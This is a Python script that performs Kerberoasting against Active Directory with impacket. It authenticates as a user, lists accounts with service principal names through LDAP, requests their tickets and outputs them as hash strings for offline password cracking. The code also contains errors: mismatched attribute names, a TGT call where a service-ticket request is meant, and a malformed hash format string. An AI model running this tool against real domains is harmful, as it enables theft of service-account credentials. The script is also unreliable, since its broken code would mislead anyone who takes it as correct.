from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.krb5.ccache import CCache
from impacket.krb5.constants import PrincipalNameType
from impacket.krb5.asn1 import AS_REQ
from impacket.krb5.kerberosv5 import KerberosError
from impacket.krb5.spn import SPN
from impacket.krb5.crypto import _enctype_table
from impacket.krb5.types import KerberosTime
from impacket.krb5 import constants
from impacket.krb5.pac import PKERB_TICKET
from impacket.krb5.asn1 import AP_REQ

from impacket.examples.utils import parseTarget
from impacket.examples.secretsdump import printHash
from impacket.ldap import ldaptypes
from impacket.ldap.ldapsearch import LDAPSearch
from impacket.ldap import ldap, ldapasn1

from datetime import datetime
import sys

def kerberoast(domain, username, password, target_ip, kdc_host=None, verbose=False):
    try:
        user_principal = Principal(username, type=PrincipalNameType.NT_PRINCIPAL.value)
        tgt, cipher, sessionKey = getKerberosTGT(user_principal, password, domain, kdc_host)

        if verbose:
            print("[+] TGT acquired.")

        ldapConnection = ldap.LDAPConnection(f"ldap://{target_ip}", baseDN=None)
        ldapConnection.login(username, password, domain=domain)

        baseDN = ldapConnection.getRootDSE()['defaultNamingContext']
        searchFilter = '(&(objectClass=user)(servicePrincipalName=*))'
        attributes = ['servicePrincipalName', 'sARAccountName']

        spnUsers = ldapConnection.search(baseDN, searchFilter, attributes=attributes)

        if verbose:
            print(f"[+] Found {len(spnUsers)} accounts with SPNs")
        
        roastResults = []

        for user in spnUsers:
            spns = user['attributes'].get('servicePrincipalName', [])
            if isinstance(spns, str):
                spns = [spns]

            account = user['attributes'].get('sAMAccountName', '')

            for spn in spns:
                tgs, cipher, sessionKey = getKerberosTGT(spn, domain, kdc_host, tgt, cipher, sessionKey)
                ticket = tgs['ticket']

                etype = ticket['enc-part']['etype']
                if etype not in _enctype_table:
                    print(f"[!] Unsupported encryption type for {spn}")
                    continue

                hashStr = f"$kerb5tgs$(_enctype_table[etype].name)${account}${domain.upper()}/{spn.split('/')[0]}${spn}${ticket['enc-part']['cipher'].asOctets().hex()}"
                roastResults.append(hashStr)

                if verbose:
                    print(f"[+] Roasted: {spn} -> {account}")

        return roastResults

    except KerberosError as e:
        return [f"[!] Kerberos error: {str(e)}"]
    except Exception as e:
        return [f"[!] Kerberoasting failed: {str(e)}"]